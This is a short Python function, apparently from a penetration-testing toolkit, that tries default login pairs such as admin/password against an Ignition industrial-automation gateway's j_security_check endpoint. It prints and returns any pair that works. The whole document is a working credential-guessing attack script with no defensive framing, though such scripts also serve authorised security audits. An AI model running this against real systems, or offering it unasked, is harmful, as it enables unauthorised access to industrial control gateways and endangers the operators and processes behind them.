def ignition_default_login(target_ip, port=8088):
    """
    Attempt login with default Ignition credentials
    """
    import requests

    url = f"http://{target_ip}:{port}/system/gateway"

    default_creds = [
        ("admin", "password"),
        ("admin", "admin"),
        ("admin", "ignition")
    ]

    for username, password in default_creds:
        data = {
            "username": username,
            "password": password,
            "useCookies": "false"
        }

        response = requests.post(f"{url}/j_security_check", data=data)

        if "Invalid" not in response.text and response.status_code == 200:
            print(f"[+] Success! Credentials: {username}:{password}")
            return (username, password)

    print("[-] Default credentials not working")
    return None

# ignition_default_login('192.168.1.100')
